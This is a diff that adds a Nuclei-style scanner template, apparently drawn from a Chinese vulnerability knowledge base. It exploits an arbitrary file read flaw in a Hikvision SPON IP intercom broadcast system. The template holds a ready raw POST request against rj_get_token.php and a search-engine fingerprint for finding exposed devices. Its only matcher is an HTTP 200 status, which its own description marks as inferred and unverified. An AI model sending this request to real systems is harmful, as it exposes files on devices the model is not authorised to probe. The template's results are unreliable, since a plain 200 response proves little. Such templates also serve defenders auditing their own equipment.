@@ -1,0 +1,54 @@
+id: poc-363914a1c78530f6ca8b
+info:
+  name: 海康威视SPONIP网络对讲广播系统rj_get_token存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/363914a1c78530f6ca8b418200f226d1
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 363914a1c78530f6ca8b418200f226d1
+    fofa: + Hunter：`web.body="vendors/custom/html5.min.js"`
+http:
+- raw:
+  - 'POST /php/rj_get_token.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 120
+
+    Sec-Ch-Ua:
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    X-Requested-With: XMLHttpRequest
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
+
+    Sec-Ch-Ua-Platform: ""
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Dest: empty
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+
+    jsondata[url]=rj_get_token.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
